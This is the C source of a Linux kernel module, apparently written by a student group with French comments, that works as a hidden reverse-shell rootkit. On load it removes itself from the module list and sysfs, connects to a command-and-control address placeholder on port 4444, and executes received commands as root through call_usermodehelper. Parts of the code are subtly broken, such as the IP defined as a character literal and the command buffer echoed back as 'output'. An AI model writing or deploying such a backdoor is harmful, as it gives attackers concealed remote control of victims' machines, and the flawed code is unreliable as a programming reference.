#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/errno.h>
#include <linux/proc_fs.h>
#include <linux/kobject.h>
#include <linux/netlink.h>
#include <linux/inet.h>
#include <linux/delay.h>

#define SERVER_IP '{C2_IP}'
#define SERVER_PORT 4444
#define MODULE_NAME "reverse_shell"
#define MAX_RETRIES 10

// Fonction pour cacher le module de /proc/modules
static void hide_module(void) {
    list_del(&THIS_MODULE->list); // Supprimer le module de la liste des modules de la machine
    kobject_del(&THIS_MODULE->mkobj.kobj); // supprime son kobject de sysfs
    printk(KERN_INFO "%s: Module hidden from /proc/modules\n", MODULE_NAME);
}

// Fonction de création d'un reverse shell
static int create_reverse_shell(void) {
    struct socket *sock;
    struct sockaddr_in addr;
    char *buffer;
    struct msghdr msg;
    struct kvec iov;
    int ret;
    int attempts = 0;

    // Créer un socket TCP
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "Failed to create socket\n");
        return ret;
    }

    // Configuration de l'adresse une socket IPv4
    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);

    // Conversion de l'IP en format binaire
    ret = in4_pton(SERVER_IP, strlen(SERVER_IP), (u8 *)&addr.sin_addr, '\0', NULL);
    if (ret < 0) {
        printk(KERN_ERR "Invalid IP address\n");
        sock_release(sock);
        return ret;
    }

    // Tentatives de connexion avec un délai de 5 secondes entre chaque tentative
    while (attempts < MAX_RETRIES) {
        printk(KERN_INFO "Attempting to connect to %s:%d (Attempt %d)\n", SERVER_IP, SERVER_PORT, attempts + 1);
        ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
        if (ret == 0) {
            printk(KERN_INFO "Successfully connected to the attacker\n");
            break;  // Connexion réussie, sortir de la boucle
        }

        printk(KERN_ERR "Failed to connect to the attacker. Retrying in 5 seconds...\n");
        attempts++;

        msleep(5000);  // Attendre 5 secondes avant de réessayer
    }

    if (ret != 0) {
        printk(KERN_ERR "Failed to connect after %d attempts\n", MAX_RETRIES);
        sock_release(sock);
        return ret;  // Retourner l'erreur si la connexion échoue après plusieurs tentatives
    }

    // Allocation de mémoire pour le buffer
    buffer = kmalloc(512, GFP_KERNEL);
    if (!buffer) {
        printk(KERN_ERR "Failed to allocate memory\n");
        sock_release(sock);
        return -ENOMEM;
    }

    // Initialiser la structure msghdr
    memset(&msg, 0, sizeof(struct msghdr));

    // Initialisation du vecteur d'IO (struct kvec)
    iov.iov_base = buffer;
    iov.iov_len = 512;

    // Utilisation de kernel_recvmsg avec kvec pour recevoir la commande
    while (1) {
        ret = kernel_recvmsg(sock, &msg, &iov, 1, 512, 0); // Attendre une commande
        if (ret <= 0) {
            break; // Quitter si la connexion est fermée ou erreur
        }

        // Exécuter la commande reçue
        ret = call_usermodehelper(buffer, NULL, NULL, UMH_WAIT_EXEC);
        if (ret < 0) {
            printk(KERN_ERR "Failed to execute command: %s\n", buffer);
        }

        // Réinitialiser le vecteur d'IO pour envoyer les résultats
        iov.iov_base = buffer;  // Réinitialiser le buffer à envoyer
        iov.iov_len = strlen(buffer);  // Longueur des données à envoyer

        // Utilisation de kernel_sendmsg pour envoyer la sortie au serveur
        ret = kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len); // Correction ici
        if (ret < 0) {
            printk(KERN_ERR "Failed to send message to attacker\n");
            break;
        }
    }

    kfree(buffer);
    sock_release(sock);
    return 0;
}

// Fonction d'initialisation du module
static int __init reverse_shell_init(void) {
    printk(KERN_INFO "Initializing reverse shell module...\n");

    // Cacher le module de /proc/modules
    hide_module();

    // Créer et établir la connexion vers l'attaquant
    create_reverse_shell();

    return 0;
}

// Fonction de déchargement du module
static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting reverse shell module...\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Grp21");
MODULE_DESCRIPTION("Kernel module with reverse shell functionality and hidden");
